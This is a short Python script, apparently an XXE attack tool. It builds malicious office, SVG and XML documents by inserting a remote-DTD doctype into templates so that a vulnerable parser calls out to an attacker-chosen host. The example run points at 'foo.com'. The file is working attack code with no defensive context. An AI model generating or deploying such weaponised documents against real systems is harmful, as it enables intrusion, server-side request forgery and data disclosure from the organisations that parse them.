payloads = {
	'rdtd': {'payload': '<!DOCTYPE roottag PUBLIC "-//OXML/XXE/EN" "IP/FILE">', 'description': 'A Remote DTD causes the XML parser to make an external connection when successful.'},
} 

filetypes = {
	'docx': 'samples/template.docx',
	'odg': 'samples/template.odg',
	'odp': 'samples/template.odp',
	'ods': 'samples/template.ods',
	'odt': 'samples/template.odt',
	'pptx': 'samples/template.pptx',
	'svg': 'samples/template.svg',
	'xlsx': 'samples/template.xlsx',
	'xml': 'samples/template.xml',
} 

class XXeFile:
	def __init__(self, host, protocol, filetype, payload, outfile):
		self.host = host
		self.protocol = protocol
		self.filetype = filetype
		self.template = filetypes[filetype]
		self.payload = payloads[payload]["payload"]
		self.description = payloads[payload]["description"]
		self.outfile = outfile

	
	def generate_payload(self):
		with open(self.template, "rb") as tmpl:
			tempdat = tmpl.read().decode('utf8')
			if "IP" in self.payload:
				self.payload = self.payload.replace("IP", self.protocol + self.host)
			tempdat = tempdat.replace("PAYLOAD", self.payload)
			return tempdat

	@property
	def to_file(self):
		tempdat = self.generate_payload()
		with open(self.outfile, "wb") as out:
			out.write(bytes(tempdat, 'utf8'))

	@property
	def to_text(self):
		tempdat = self.generate_payload()
		print(tempdat)


foo = XXeFile("foo.com", "http://", "xml", "rdtd", "output.payload")

print(foo.host, foo.protocol, foo.payload, foo.template)
foo.to_file
